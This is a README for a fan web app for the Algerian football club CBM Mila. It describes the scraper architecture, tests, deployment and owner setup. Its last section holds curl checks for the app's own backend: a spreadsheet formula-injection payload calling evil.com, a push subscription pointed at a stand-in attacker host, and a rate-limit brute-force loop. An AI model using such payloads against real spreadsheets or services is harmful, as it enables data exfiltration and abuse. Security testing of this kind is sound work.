# CBM Mila 1936 · شباب بلدية ميلة 🔴⚪

Official open-source Progressive Web App (PWA) for supporters of **Chabab Baladiat Mila (CBM 1936 — Club ID `733`)**, competing in the Algerian **Ligue Inter-Régions — Group East (`شرق`, `seasonId: 6`, `competitionId: 4275`)**.

- **Live App:** [https://cbm-mila.github.io/CBM-MILA/](https://cbm-mila.github.io/CBM-MILA/)
- **Source Data:** [Ligue Inter-Régions de Football (lirf.dz)](https://www.lirf.dz/ar/ranking)

## Architecture & Data Flow

```text
+-------------------------------------------------------------------+
|                   https://www.lirf.dz (Arabic)                    |
|     /ar/ranking  •  /ar/calendar  •  /ar/club/733  •  /ar/match   |
+-------------------------------------------------------------------+
                                  |
                                  | Polite HTTP (ETag / If-Modified-Since, ~1 req/s, GET-only retry)
                                  v
+-------------------------------------------------------------------+
|              scraper.py (GitHub Actions: update-data.yml)         |
|  • Competition pinning (season 2026/2027, group شرق, 16-club set) |
|  • Header-based table parser & explicit penalty model             |
|  • Match state machine (scheduled/live/finished/postponed/forfeit)|
|  • Sanity checks + JSON Schema validation (data/schema.json)      |
|  • Pre-persisted notification dedupe + parallel Web Push (10x)    |
+-------------------------------------------------------------------+
        |                                         |
        | git commit & push (cbm-bot)             | POST (ADMIN_KEY / VAPID)
        v                                         v
+-------------------------------+   +-------------------------------+
|   GitHub Pages Static Host    |   |  Telegram Bot + Code.gs API   |
|  • data/data.json (Single SoT)|   |  • Digital Supporter Cards    |
|  • index.html / app.js / sw.js|   |  • Web Push Subscriptions     |
+-------------------------------+   +-------------------------------+
        |                                         |
        +--------------------+--------------------+
                             |
                             v
+-------------------------------------------------------------------+
|          Supporter PWA (Arabic / French / English, RTL)           |
|  • sw.js: Network-first for shell + data, SWR for images/fonts    |
|  • Match-day 60s live polling, countdown, stale-data banner       |
+-------------------------------------------------------------------+
```

## Running the Scraper & Tests Locally

1. **Install dependencies:**
   ```bash
   python3 -m venv .venv
   source .venv/bin/activate
   pip install -r requirements.txt
   ```

2. **Preview changes against live `lirf.dz` without modifying files (`--dry-run`):**
   ```bash
   python scraper.py --dry-run --verbose
   ```

3. **Allow a legitimate league correction if `played` decreases once (`--accept-regression`):**
   ```bash
   python scraper.py --accept-regression --verbose
   ```

4. **Run against saved HTML fixtures (offline test mode):**
   ```bash
   python scraper.py --dry-run --fixture-dir tests/fixtures
   ```

5. **Run the automated test suite & schema/syntax checks:**
   ```bash
   pytest -v
   python -m py_compile scraper.py scripts/notify_failure.py
   node --check app.js
   node --check sw.js
   node --check config.js
   ```

## Refreshing HTML Test Fixtures (`tests/fixtures/`)

The HTML files in `tests/fixtures/` mirror the real markup published by `https://www.lirf.dz` (no synthetic CSS classes). To refresh them when LIRF updates its template:

```bash
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/ranking" -o tests/fixtures/ranking.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/" -o tests/fixtures/calendar.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/club/733" -o tests/fixtures/club_733.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/match/226410" -o tests/fixtures/match_226410_finished.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/match/226424" -o tests/fixtures/match_226424_mismatched.html
curl -sL -A "CBM-Mila-Fan-PWA/3.1" "https://www.lirf.dz/ar/statistics" -o tests/fixtures/statistics.html
pytest -v
```

## Confirming GitHub Pages Deployment After a Bot Commit & Schedule Keep-Alive

1. **GitHub Pages Automatic Deployment:**
   Bot commits created by `.github/workflows/update-data.yml` intentionally omit `[skip ci]` so GitHub Pages never suppresses site deployments when `data/data.json` is updated (while `.github/workflows/ci.yml` ignores `data/**` pushes via `paths-ignore: ["data/**"]`).
   To confirm a new Pages deployment succeeded after a `cbm-bot` commit:
   - Open the repository on GitHub → **Actions** → **pages-build-deployment** (or check **Deployments → github-pages** on the right sidebar of the repo home page).
   - Verify via CLI:
     ```bash
     curl -s "https://cbm-mila.github.io/CBM-MILA/data/data.json?ts=$(date +%s)" | head -n 5
     ```

2. **60-Day Schedule Keep-Alive:**
   GitHub automatically disables scheduled workflows after 60 days of repository inactivity. `.github/workflows/update-data.yml` includes `permissions: actions: write` and runs `gh api --method PUT "/repos/${GITHUB_REPOSITORY}/actions/workflows/update-data.yml/enable"` on scheduled runs to keep the cron active without creating noisy commits.

## Rolling Over to a New Season

Season parameters are read dynamically from `data/data.json` under `sourceMeta` and `club` — no code changes in `scraper.py` or `app.js` are required:

1. Update `data/data.json` -> `sourceMeta`:
   - `seasonId`: new LIRF season identifier (e.g. `"7"`)
   - `seasonName`: new season label (e.g. `"2027/2028"`)
   - `competitionId`: group ID (e.g. `"4275"` for Group East)
   - `competitionAr`: Arabic group name (`"شرق"`)
2. Update `opponents` and initial `matches` / `standings` for the new season's 16 clubs.
3. Run `python scraper.py --dry-run --verbose` to verify against `lirf.dz`.

## Manual Owner Checklist (Required One-Time Setup)

### 1. Delete Stray Root Files in GitHub
Ensure the 5 obsolete files in the repository root are deleted so `.github/workflows/` and `data/data.json` are the single source of truth:
```bash
git rm -f data.json auto-update.yml update.yml update-data.yml CBM-MILA-test6-update.zip
git commit -m "chore(repo): remove stray root data.json, workflow copies, and zip archive"
git push
```

### 2. Google Apps Script Deployment (`Code.gs` v3.2)
1. Open your Google Sheet → **Extensions → Apps Script**.
2. Replace the contents of `Code.gs` with the updated `Code.gs` file from this repository and click **Save (💾)**.
3. Click **Project Settings (⚙️)** on the left sidebar → scroll to **Script Properties** → ensure property `ADMIN_KEY` is set to a strong secret string.
4. Click **Deploy → Manage deployments** (top right) → click the **Edit (✏️)** icon on your active Web App deployment → under **Version**, select **New version** → click **Deploy**. *(Note: saving `Code.gs` without creating a **New version** under Manage deployments leaves the live `/exec` endpoint running old code!)*

### 3. GitHub Actions Repository Secrets (`Settings → Secrets and variables → Actions`)

| Secret Name | Purpose |
| :--- | :--- |
| `TELEGRAM_BOT_TOKEN` | Bot token from `@BotFather` for match result, kickoff, and failure alerts |
| `TELEGRAM_CHAT_ID` | Target Telegram channel/group chat ID |
| `ADMIN_KEY` | Shared secret matching `ADMIN_KEY` in Google Apps Script Properties |
| `REGISTRY_URL` | Deployed Google Apps Script Web App `/exec` URL |
| `VAPID_PRIVATE_KEY` | VAPID private key matching `self.CBM_VAPID_PUBLIC_KEY` in `config.js` |

### 4. Verifying `Code.gs` Security & Rate Limits via `curl`
Replace `EXEC_URL` with your Google Apps Script `/exec` URL:
```bash
EXEC_URL="https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec"

# 1) Formula injection attempt -> stored safely with leading apostrophe ('=IMPORTXML...)
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"register","name":"=IMPORTXML(\"https://evil.com\",\"//a\")","dev":"dev-test-1","lang":"ar"}'

# 2) Disallowed push endpoint -> rejected with {"ok":false,"code":"invalid_subscription"}
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"push_sub","dev":"dev-test-1","sub":{"endpoint":"https://evil.example.com/push","keys":{"p256dh":"BOr...","auth":"xyz..."}}}'

# 3) Family member registering a second card with a different name on the same phone -> succeeds!
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"register","name":"بلعريبي سعيد","dev":"family-phone-1","lang":"ar"}'
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"register","name":"بلعريبي ياسين","dev":"family-phone-1","lang":"ar"}'

# 4) 6 failed restore attempts on a card -> 6th returns {"ok":false,"code":"rate_limit"}
for i in 1 2 3 4 5 6; do
  curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
    -d '{"v":2,"a":"restore","name":"Wrong Name","supporterId":"CBM-123456","dev":"attacker-dev-'$i'"}'
  echo ""
done

# 5) Public verify lookup -> read-only, returns maskedName, rate-limited at 30 req / 15m per dev
curl -sL -X POST "$EXEC_URL" -H "Content-Type: text/plain;charset=utf-8" \
  -d '{"v":2,"a":"verify","supporterId":"CBM-123456","dev":"scanner-dev-1"}'
```
